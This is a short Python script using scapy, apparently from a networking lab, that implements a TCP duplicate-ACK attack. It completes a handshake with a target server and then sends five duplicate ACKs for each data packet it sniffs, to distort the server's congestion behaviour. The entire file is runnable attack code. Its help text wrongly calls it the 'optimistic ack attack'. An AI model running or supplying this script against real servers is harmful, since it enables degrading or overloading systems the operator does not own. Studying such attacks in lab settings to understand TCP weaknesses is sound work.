#!/usr/bin/env python
"""
This file implements the Duplication ACK attack.
"""

import argparse
from scapy.all import *

parser = argparse.ArgumentParser(description='Attack a TCP server with the optimistic ack attack.')
parser.add_argument('--dport', default=8000, type=int, help='The port to attack.')
parser.add_argument('--sport', default=8000, type=int, help='The port to send the TCP packets from.')
parser.add_argument('--host', default='127.0.0.1', type=str, help='The ip address to attack.')
args = parser.parse_args()

DUPLICATION_FACTOR = 5
INIT_SEQ_NO = 12345
WIN_SIZE = 50000

if __name__ == "__main__":
   
    print "Making connection to %s from port %d." % (args.host, args.sport)
    print "Starting three-way handshake..."
    ip_header = IP(dst=args.host) # An IP header that will take packets to the target machine.
    seq_no = INIT_SEQ_NO # Our starting sequence number 
    window = WIN_SIZE # Advertise a large window size.

    syn = ip_header / TCP(window=window, sport=args.sport, dport=args.dport, flags='S', seq=seq_no) # Construct a SYN packet.
    synack = sr1(syn) # Send the SYN packet and receive a SYNACK

    ack = ip_header / TCP(window=window, sport=args.sport, dport=args.dport, flags='A', ack=synack.seq + 1, seq=(seq_no + 1)) # ACK the SYNACK

    socket = conf.L2socket(iface='client-eth0')
    
    # Send duplicat ACKs
    def handle_packet(data):
        data = data.payload.payload
        
        if data.sport != args.dport: return
        if data.dport != args.sport: return
        if not data.payload or len(data.payload) == 0: return
        final_ack = data.seq + len(data.payload) + 1
        
        for i in range(DUPLICATION_FACTOR):
            socket.send(Ether() / ip_header / TCP(window=window, sport=args.sport, dport=args.dport, flags='A', ack=final_ack, seq=(seq_no + 1)))
    
    socket.send(Ether() / ack)
    sniff(iface='client-eth0', filter='tcp and ip', prn=handle_packet, timeout=5) 
